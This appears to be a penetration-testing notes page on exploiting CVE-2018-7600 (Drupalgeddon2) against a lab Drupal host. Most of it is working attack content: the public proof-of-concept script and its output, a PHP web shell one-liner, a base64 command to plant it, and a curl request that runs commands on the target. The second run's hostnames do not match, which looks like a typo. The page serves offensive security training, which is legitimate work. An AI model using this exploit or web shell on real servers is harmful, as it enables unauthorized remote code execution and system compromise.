---
icon: drupal
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# CVE-2018-7600 (Drupalgeddon2)

{% hint style="info" %}
## Exploit DB

[https://www.exploit-db.com/exploits/44448](https://www.exploit-db.com/exploits/44448)
{% endhint %}

## Exploit Script

{% code title="Command" %}
```bash
python3 drupalgeddon2.py
```
{% endcode %}

{% code title="Output" %}
```bash
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal.acme.com/

Check: http://drupal.acme.com/hello.txt
```
{% endcode %}

We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.

```bash
curl -s http://drupal.acme.com/hello.txt

;-)
```

Now let's modify the script to gain remote code execution by uploading a malicious PHP file.

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

```bash
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

Next, run the modified exploit script to upload our malicious PHP file.

{% code title="Command" %}
```bash
python3 drupalgeddon2.py
```
{% endcode %}

```bash
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupa.acme.com/mrb3n.php
```

Finally, we can confirm remote code execution using `cURL`.

```bash
curl http://drupal.acme.com/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
